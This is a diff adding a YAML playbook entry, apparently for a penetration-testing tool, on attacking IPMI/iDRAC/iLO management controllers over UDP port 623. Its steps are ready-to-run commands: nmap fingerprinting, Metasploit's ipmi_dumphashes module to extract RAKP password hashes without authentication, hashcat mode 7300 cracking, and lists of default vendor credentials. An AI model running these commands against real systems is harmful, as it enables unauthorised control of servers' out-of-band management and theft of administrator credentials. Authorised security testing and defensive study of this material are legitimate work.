@@ -1,0 +1,42 @@
+id: ipmi
+name: IPMI Baseboard Management Controller (Port 623 UDP)
+category: network
+description: Methodology for Intelligent Platform Management Interface (IPMI / iDRAC / iLO) on UDP port 623. Covers RAKP 2.0 flaw hash dumping and Hashcat mode 7300 cracking.
+port_triggers:
+  - 623
+service_triggers:
+  - ipmi
+  - asf-rmcp
+tags:
+  - ipmi
+  - idrac
+  - ilo
+  - rakp
+  - passwords
+steps:
+  - id: ipmi-version-scan
+    title: IPMI Version & BMC Detection
+    phase: reconnaissance
+    purpose: Query the BMC (Baseboard Management Controller) to determine IPMI version (1.5 / 2.0) and vendor (Dell iDRAC / HP iLO / Supermicro).
+    command: nmap -sU --script ipmi-version -p 623 {{TARGET}}
+    expected_output:
+      - '| ipmi-version: IPMI-2.0, Dell iDRAC9, UserAuth: password, kgHash: default'
+    common_mistakes:
+      - IPMI runs on UDP; use `nmap -sU`.
+    if_success: IPMI 2.0 detected! Proceed to RAKP hash dumping.
+    if_failure: Port closed or not IPMI. Check other services.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi
+  - id: ipmi-dump-hashes
+    title: Dump RAKP User Hashes (Metasploit)
+    phase: exploitation
+    purpose: Exploit the IPMI 2.0 RAKP protocol flaw to request password verification hashes for any username without authentication.
+    command: msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {{TARGET}}; run; exit"
+    expected_output:
+      - '[+] {{TARGET}}:623 - Hash found: admin:4a8f9c...:83e01...'
+    common_mistakes:
+      - 'Test common default BMC accounts: `root`, `ADMIN`, `Administrator`, `calvin`.'
+    if_success: 'RAKP hash dumped! Crack with Hashcat mode 7300: `hashcat -m 7300 ipmi.hashes rockyou.txt -O`.'
+    if_failure: 'RAKP flaw mitigated. Test default vendor passwords: `root:calvin` (Dell) or `ADMIN:ADMIN` (Supermicro).'
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi
